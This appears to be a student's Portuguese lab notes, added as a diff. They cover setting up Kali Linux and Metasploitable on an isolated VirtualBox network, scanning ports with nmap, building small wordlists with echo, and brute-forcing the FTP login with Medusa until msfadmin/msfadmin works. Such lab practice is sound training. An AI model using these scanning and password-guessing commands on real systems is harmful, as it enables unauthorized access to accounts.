@@ -1,0 +1,71 @@
+
+## Configuração dos sistemas virtuais
+ARQUIVO METASPLOITABLE.ZIP
+	Ao extrair o arquivo vamos se deparar com o arquivo .VMDH
+	Teremos que usa-lo como disco virtual na virtual box
+APOS KALI LINUX E META INSTALADOS:
+	Temos que mudar a placa de rede para os dois se conectarem porem sem internet, para isso vamos mudar a placa para ![[Pasted image 20251106230211.png]]
+Ao iniciar o sistema Meta ele ira pedir login e senha 
+	login do terminal: msfadmin
+	senha: msfadmin
+kali linux
+	login: kali
+	senha: kali
+## Verificando Ip
+METASPLOITABLE: no terminal digite 'ip a'
+kali linux: no terminal digite 'ifconfig'
+## FERRAMENTAS QUE SERAM UTILIZADAS
+- NMAP PARA SCAN DE PORTAS ABERTAS
+- MEDUSA PARA QUEBRAR SENHA
+- COMANDO ECHO PARA CRIAR .TXT
+
+ANALISANDO PORTAS ABERTAS
+nmap -sV -p 21,22,80,445,139 192.168.56.101
+
+*PORTAS ABERTAS ENCONTRADAS*
+
+
+
+**CONECTANDO-SE NO META ATRAVES DE PORTAS ABERTAS**
+ftp 192.168.56.101
+	![[Pasted image 20251106211822.png]]
+**UTILIZANDO ECHO**
+iremos utilizar o comando echo para criar arquivos txt tanto para usuarios, quanto para senhas
+
+**usuarios:**
+echo -e "user\nmsfadmin\nadmin\nroot" > users.txt
+
+user
+msfadmin
+admin
+root
+ira criar os usuários citados acima automaticamente, pois são o que esta no comando 
+
+**senhas:**
+echo -e "123456\npassword\nqwerty\nmsfadmin" > pass.txt
+
+123456
+password
+qwerty
+msfadmin
+ira criar as senhas citados acima automaticamente, pois são o que esta no comando
+
+**QUEBRANDO A SENHA DO SISTEMA**
+![[Pasted image 20251106214658.png]]
+	*medusa -h (informar o ip ou hostname do alvo)*
+	medusa -U (Arquivo que contem possíveis nomes de usuários)
+	medusa -P (Arquivo que contem possíveis senhas)
+	medusa -M (nome do modulo a ser executado .mod)
+	medusa -t (Total de tentativas de login para teste)
+medusa -h  192.168.56.101 -U users.txt -P pass.txt -M ftp -t 6
+
+**AO ENCONTRAR A SENHA**
+O MEDUSA IRA APARACER [SUCESS]
+![[Pasted image 20251106221533.png]]
+A SENHA E LOGIN EM QUESTÃO SERIA  
+USER: msfadmin
+SENHA: msfadmin
+
+![[Pasted image 20251106221736.png]]
+###### **LOGIN BEM SUCEDIDO** 
+
